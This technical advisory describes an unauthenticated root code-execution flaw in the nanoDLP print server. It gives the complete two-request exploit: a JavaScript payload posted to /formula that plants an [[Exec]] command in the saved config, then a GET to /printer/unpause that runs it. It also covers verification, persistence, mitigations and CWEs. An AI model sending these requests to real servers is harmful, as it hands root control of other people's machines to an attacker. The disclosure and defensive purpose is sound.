# nanoDLP Unauthenticated Root RCE via G-code Injection — Technical Analysis

## Overview

nanoDLP (3D SLA print control server, Go binary, runs as root by default) exposes an unauthenticated remote code execution vulnerability. The Guest (unauthenticated) endpoint `POST /formula` evaluates user-supplied JavaScript in an embedded Otto JS sandbox, which exposes a live nanoDLP domain object via `nanodlpContext()`. The `Config` object is a cross-request shared live pointer; `Config.ShieldUnpause` (the G-code run when the print engine unpauses) is writable, and `Config.Save()` persists it to `db/machine.json` without sanitization. An attacker injects `[[Exec <cmd>]]` into `ShieldUnpause`, then the also-unauthenticated `GET /printer/unpause` triggers the print engine to execute the G-code, reaching `os/exec` with shell semantics as root. Dynamically verified with `uid=0(root)`.

- **Authentication required**: None (both steps unauthenticated)
- **Preconditions**: Default configuration; network reachability to the HTTP listener
- **Affected versions**: stable Linux amd64 build #10729 (2025-04); other builds with the same behavior are likely affected
- **Privilege**: root (dynamically verified `uid=0(root)`)

## Architecture

```
L1 external access: nanoDLP HTTP listener (Go binary, default runs as root)
L2 auth boundary: Guest endpoints - POST /formula and GET /printer/unpause are unauthenticated
L3 source: POST /formula (Guest) with [JS]...[/JS] block -> Otto JS eval
L4 live-object escape: nanodlpContext() returns live Config struct (cross-request shared pointer)
L5 persistence: Config.ShieldUnpause = "[[Exec <cmd>]]"; Config.Save() -> db/machine.json (no sanitization)
L6 trigger: GET /printer/unpause (unauthenticated) -> machine.(*StatusStruct).Unpause
L7 sink: gcode/run.ExecRequest -> os/exec (shell semantics) as root
```

## Authentication Boundary

The `/formula` endpoint (`web.formulaPage` @ 0x140c14640) is a Guest route with no authentication. It accepts a form field `str=<formula>`; when the value contains a `[JS]<code>[/JS]` block, the code is evaluated by the embedded Otto JS engine, and the `output` variable is returned as the response body. `GET /printer/unpause` (`web.printerUnpause` @ 0x140c1cc60) is likewise unauthenticated; it returns HTTP 302 -> `/` as a normal post-action redirect (not an auth redirect).

## Stage 1: Sink Identification

The G-code keyword dispatcher parses `[[Exec <cmd>]]` and routes it to `gcode/run.ExecRequest` @ 0x14067b9a0, which executes the command via `os/exec` with shell semantics (equivalent to `sh -c <cmd>`). The command runs with the nanoDLP process's privileges - root in the default deployment.

## Stage 2: Source Identification

Two unauthenticated sources:
1. `POST /formula` (Guest) - the Otto JS sandbox context exposes `{console, output, context(""), nanodlpContext(function), eval, Function, this}`. There is NO direct `System`/`Command`/`Read`/`Write`/`Send`/`File`/`Print`/`Sleep`/`Request` binding, so the sandbox itself has no direct RCE primitive. But `nanodlpContext()` returns a live nanoDLP domain object `{Stat, Analytic, Config, Layer, Plate, Profile, Status}` where `Config` is a live cross-request shared pointer.
2. `GET /printer/unpause` (Guest) - triggers the print engine's unpause flow.

## Stage 3: Data Flow

```
[Attacker]
  |
  | Step 1: POST /formula (Guest, unauth)
  |   str=[JS]var ctx=nanodlpContext(); ctx.Config.ShieldUnpause="[[Exec <cmd>]]"; ctx.Config.Save();[/JS]
  v
[web.formulaPage @ 0x140c14640]  <- Otto JS eval (Guest, no auth)
  |
  | nanodlpContext() returns live Config pointer
  | ctx.Config.ShieldUnpause = "<malicious G-code>"  <- write to runtime config (shared pointer)
  | ctx.Config.Save()  <- persist to db/machine.json (no [[Exec]] sanitization)
  v
[db/machine.json]  ShieldUnpause = "[[Exec <cmd>]]"  <- persisted (survives restart)
  |
  | Step 2: GET /printer/unpause (unauth, 302->/)
  v
[web.printerUnpause @ 0x140c1cc60]  <- unauth handler (no auth gate)
  |
  | call machine.(*StatusStruct).Unpause
  v
[machine.(*StatusStruct).Unpause @ 0x14039c7a0]
  |
  | function-pointer dispatch -> gcode callback (runs ShieldUnpause G-code)
  v
[gcode keyword dispatch]  parses [[Exec <cmd>]]
  |
  v
[gcode/run.ExecRequest @ 0x14067b9a0]  <- SINK
  |
  | os/exec (shell semantics sh -c <cmd>)
  v
[<cmd> executed as root]  <- uid=0(root)
```

Key function addresses (GoReSym, Linux amd64):
| Function | Address |
|----------|---------|
| web.formulaPage | 0x140c14640 |
| web.printerUnpause | 0x140c1cc60 |
| machine.(*StatusStruct).Unpause | 0x14039c7a0 |
| gcode/run.ExecRequest | 0x14067b9a0 |

## Stage 4: Injection / Exploit Construction

### Step 1 - inject (unauth POST /formula)
```
POST /formula HTTP/1.1
Content-Type: application/x-www-form-urlencoded

str=[JS]var ctx=nanodlpContext(); ctx.Config.ShieldUnpause="[[Exec id > public/rce_proof.txt]]"; ctx.Config.Save(); output="INJECTED";[/JS]
```
- Otto JS eval: `nanodlpContext()` gets live Config -> writes ShieldUnpause -> `Save()` persists
- Response: `HTTP 200`, body=`INJECTED`
- Persistence check: `grep ShieldUnpause db/machine.json` -> `ShieldUnpause": "[[Exec id > public/rce_proof.txt]]"`

### Step 2 - trigger (unauth GET /printer/unpause)
```
GET /printer/unpause HTTP/1.1
(no Cookie/Authorization)
```
- Response: `HTTP 302 Found`, `Location: /` (post-action redirect, not auth)
- Server asynchronously executes ShieldUnpause G-code -> `[[Exec id > public/rce_proof.txt]]` -> os/exec as root

### Step 3 - fetch output (GET /static/)
```
GET /static/rce_proof.txt HTTP/1.1
```
- Response: `HTTP 200`, body=`uid=0(root) gid=0(root) groups=0(root)`
- nanoDLP serves the `public/` directory under the `/static/` prefix, so a file written to `public/rce_proof.txt` is fetchable via `/static/rce_proof.txt`

Command construction: `[[Exec <cmd>]]` executes the full `<cmd>` string with shell semantics; redirection (`>`/`>>`), pipes (`|`), and compound commands (`;`/`&&`) are supported.

## Dynamic Verification

Executed on the target (2026-08-07), PoC run with no credentials:

```
[*] Step 1: POST /formula -> HTTP 200, body='INJECTED'
[*] Step 2: GET /printer/unpause -> HTTP 302->/ (action executed)
[*] Step 3: GET /static/rce_proof.txt -> HTTP 200
[+] command output: uid=0(root) gid=0(root) groups=0(root)
[+] unauth root RCE verified
```

Target-side confirmation confirmed the marker file and process identity. The injected `ShieldUnpause` is persisted in `db/machine.json`; every subsequent `/printer/unpause` re-executes the command. Cleanup: re-POST `/formula` with `ctx.Config.ShieldUnpause=""; ctx.Config.Save();`.

## Mitigation

1. Require authentication on `/formula` and `/printer/unpause` (or gate behind an admin session)
2. Add an allowlist/switch for `[[Exec]]` G-code commands, or disable it entirely
3. Sanitize `Config.Save()` to reject `[[Exec]]` patterns before persisting
4. Do not run the server as root; run under a dedicated low-privilege user
5. Restrict network exposure of the print server to trusted management networks

## CWEs

- CWE-306 (Missing Authentication for Critical Function) - /formula and /printer/unpause unauth
- CWE-94 (Improper Control of Generation of Code) - live Config object exposed to JS sandbox
- CWE-78 (Improper Neutralization of Special Elements used in an OS Command) - [[Exec]] G-code to os/exec
- CWE-250 (Execution with Unnecessary Privileges) - server runs as root
